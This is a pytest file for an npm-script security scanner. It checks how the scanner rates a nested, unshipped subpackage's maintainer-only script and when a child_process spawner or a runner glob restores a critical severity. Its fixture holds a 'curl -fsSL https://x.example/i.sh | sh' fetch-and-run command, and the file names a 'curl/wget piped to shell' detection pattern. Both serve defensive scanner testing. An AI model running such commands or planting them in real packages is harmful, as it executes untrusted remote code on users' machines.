"""Precision: a maintainer-only script in a nested package.json the root never ships.

The adversarial set ``tests/adversarial/cases_subpackage_scripts.py`` pins verdicts;
this file pins :func:`unshipped_subpackage`'s edges and the star-import glob fix.
"""

from __future__ import annotations

import json

import pytest

from src.scanner.npm_scripts import MAINTAINER_WHY, restore_externally_invoked, unshipped_subpackage
from src.scanner.scan import _scan_content

PIPE = "curl/wget piped to shell"
SUB = json.dumps({"name": "ext", "private": True,
                  "scripts": {"pretest:e2e": "curl -fsSL https://x.example/i.sh | sh"}})


def _tree(root: dict | None, **extra: str) -> dict[str, str]:
    t = {"ext/package.json": SUB, "lib/index.js": "module.exports = 1;\n"}
    if root is not None:
        t["package.json"] = json.dumps({"name": "cli", "version": "1.0.0", **root})
    t.update(extra)
    return t


@pytest.mark.parametrize("root,extra,want", [
    ({"files": ["lib"]}, {}, True),
    ({"files": ["./lib/", "!ext"]}, {}, True),
    ({"files": ["lib"], "bin": "lib/cli.js", "main": "lib/index.js"}, {}, True),
    # a fixture repo elsewhere declaring workspaces cannot reach ext/
    ({"files": ["lib"]}, {"test/fixtures/ws/package.json": '{"workspaces": ["a"]}'}, True),
    (None, {}, False),
    ({}, {}, False),
    ({"files": ["lib", "ext"]}, {}, False),
    ({"files": ["lib", "./ext/dist"]}, {}, False),
    ({"files": ["**/*.js"]}, {}, False),
    ({"files": ["e*"]}, {}, False),
    ({"files": ["."]}, {}, False),
    ({"files": ["lib"], "main": "ext/index.js"}, {}, False),
    ({"files": ["lib"], "bin": {"x": "./ext/x.js"}}, {}, False),
    ({"files": ["lib"], "workspaces": ["ext"]}, {}, False),
    ({"files": ["lib"]}, {"lerna.json": "{}"}, False),
    ({"files": "lib"}, {}, False),
])
def test_unshipped_subpackage(root, extra, want):
    assert unshipped_subpackage("ext/package.json", _tree(root, **extra)) is want


def test_root_package_is_never_a_subpackage():
    assert not unshipped_subpackage("package.json", _tree({"files": ["lib"]}))


def _marked(texts: dict[str, str]) -> list:
    findings, _p, _s = _scan_content(texts["ext/package.json"], "ext/package.json")
    pipe = [f for f in findings if f.name == PIPE]
    assert pipe and pipe[0].remediation == MAINTAINER_WHY
    restore_externally_invoked(pipe, texts)
    return pipe


SPAWNER = "const cp = require('child_process');\nmodule.exports = (a) => cp.spawn('npm', a);\n"


def test_unshipped_subpackage_ignores_tree_wide_spawner():
    (f,) = _marked(_tree({"files": ["lib"]}, **{"lib/run.js": SPAWNER}))
    assert f.severity == "low"


def test_shipped_subpackage_keeps_tree_wide_spawner():
    (f,) = _marked(_tree({"files": ["lib", "ext"]}, **{"lib/run.js": SPAWNER}))
    assert f.severity == "critical"


def test_star_import_is_not_a_script_glob():
    star = 'import * as path from "node:path";\nexport * from "node:fs";\n'
    (f,) = _marked(_tree({}, **{"lib/a.ts": star}))
    assert f.severity == "low"


def test_real_runner_glob_still_restores():
    glob = 'import * as cp from "node:child_process";\ncp.execSync(\'npx run-p "pretest:*"\');\n'
    (f,) = _marked(_tree({}, **{"lib/a.ts": glob}))
    assert f.severity == "critical"
